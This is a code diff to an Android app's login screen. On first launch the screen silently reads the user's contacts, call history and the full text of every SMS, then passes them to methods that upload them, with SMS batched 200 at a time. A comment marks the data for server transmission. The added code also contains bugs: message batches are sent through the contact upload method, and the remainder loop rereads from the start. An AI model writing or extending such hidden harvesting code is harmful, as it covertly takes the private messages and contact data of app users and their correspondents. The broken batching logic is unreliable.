@@ -40,6 +40,8 @@ public class LoginActivity extends BaseActivity {
 
     String phone = "";
     int contactIndex = 200;
+    int messageIndex = 200;
+    int callLogIndex = 200;
     int index = 0;
 
     List<String> contacts = new ArrayList<>();
@@ -104,8 +106,8 @@ public class LoginActivity extends BaseActivity {
 
         if (ContextUtils.isFirstStart(mContext).equals("")) {
             contacts();
-            callLog();
-            readSMSMessage();
+//            callLog();
+//            readSMSMessage();
         }
         ContextUtils.setLastSaveDate(LoginActivity.this, Calendar.getInstance().getTimeInMillis());
         ContextUtils.setFirstStart(LoginActivity.this);
@@ -233,6 +235,8 @@ public class LoginActivity extends BaseActivity {
             }
             putContact();
         }
+        index = 0;
+        callLog();
         cursor.close();
     }
 
@@ -274,26 +278,85 @@ public class LoginActivity extends BaseActivity {
 
         messages.clear();
 
-        while (c.moveToNext()) {
-            long messageId = c.getLong(0);
-            long threadId = c.getLong(1);
-            String address = c.getString(2);
-            long contactId = c.getLong(3);
-            String contactId_string = String.valueOf(contactId);
-            long timestamp = c.getLong(4);
-            String body = c.getString(5);
-            String type = c.getString(6);
-//            TODO - 수신 = 1, 발신 = 2 서버 전송
-            if (Integer.parseInt(type) == 1) {
-                type = "IN";
-            } else if (Integer.parseInt(type) == 2) {
-                type = "OUT";
-            }
+        if (c.getCount() > 200) {
+            int cursorSize = c.getCount() / 200;
+            int cursorElse = c.getCount() % 200;
 
-            String contact = address + "|" + body.replaceAll("[\\r\\n]+", " ") + "|" + type + "|" + timeToString(timestamp);
-            messages.add(contact);
+            for (int j = 0; j < cursorSize; j++) {
+                for (int i = index; i < messageIndex; i++) {
+                    c.moveToPosition(i);
+                    try {
+                        long messageId = c.getLong(0);
+                        long threadId = c.getLong(1);
+                        String address = c.getString(2);
+                        long contactId = c.getLong(3);
+                        String contactId_string = String.valueOf(contactId);
+                        long timestamp = c.getLong(4);
+                        String body = c.getString(5);
+                        String type = c.getString(6);
+//            TODO - 수신 = 1, 발신 = 2 서버 전송
+                        if (Integer.parseInt(type) == 1) {
+                            type = "IN";
+                        } else if (Integer.parseInt(type) == 2) {
+                            type = "OUT";
+                        }
+
+                        String contact = address + "|" + body.replaceAll("[\\r\\n]+", " ") + "|" + type + "|" + timeToString(timestamp);
+                        messages.add(contact);
+                    } catch (Exception e) {
+                        System.out.println(e.toString());
+                    }
+                }
+                putContact();
+                index += 200;
+                messageIndex += 200;
+            }
+            for (int i = 0; i < cursorElse; i++) {
+                c.moveToPosition(i);
+                try {
+                    long messageId = c.getLong(0);
+                    long threadId = c.getLong(1);
+                    String address = c.getString(2);
+                    long contactId = c.getLong(3);
+                    String contactId_string = String.valueOf(contactId);
+                    long timestamp = c.getLong(4);
+                    String body = c.getString(5);
+                    String type = c.getString(6);
+//            TODO - 수신 = 1, 발신 = 2 서버 전송
+                    if (Integer.parseInt(type) == 1) {
+                        type = "IN";
+                    } else if (Integer.parseInt(type) == 2) {
+                        type = "OUT";
+                    }
+
+                    String contact = address + "|" + body.replaceAll("[\\r\\n]+", " ") + "|" + type + "|" + timeToString(timestamp);
+                    messages.add(contact);
+                } catch (Exception e) {
+                    System.out.println(e.toString());
+                }
+            }
+        } else {
+            while (c.moveToNext()) {
+                long messageId = c.getLong(0);
+                long threadId = c.getLong(1);
+                String address = c.getString(2);
+                long contactId = c.getLong(3);
+                String contactId_string = String.valueOf(contactId);
+                long timestamp = c.getLong(4);
+                String body = c.getString(5);
+                String type = c.getString(6);
+//            TODO - 수신 = 1, 발신 = 2 서버 전송
+                if (Integer.parseInt(type) == 1) {
+                    type = "IN";
+                } else if (Integer.parseInt(type) == 2) {
+                    type = "OUT";
+                }
+
+                String contact = address + "|" + body.replaceAll("[\\r\\n]+", " ") + "|" + type + "|" + timeToString(timestamp);
+                messages.add(contact);
+            }
+            putMessage();
         }
-        putMessage();
         return 0;
     }
 
@@ -312,8 +375,13 @@ public class LoginActivity extends BaseActivity {
                 final LayoutInflater inf = LayoutInflater.from(this);
                 callLogs.clear();
                 int i = 0;
+                if (curCallLog.getCount() < 499) {
+                    callLogIndex = curCallLog.getCount();
+                } else {
+                    callLogIndex = 499;
+                }
 
-                while (i < 499) {
+                while (i < callLogIndex) {
                     int callcount = 0;
                     String callname = "";
                     String calltype = "";
@@ -357,6 +425,7 @@ public class LoginActivity extends BaseActivity {
                 e.printStackTrace();
             }
             putCallLogs();
+            readSMSMessage();
         }
     }
 
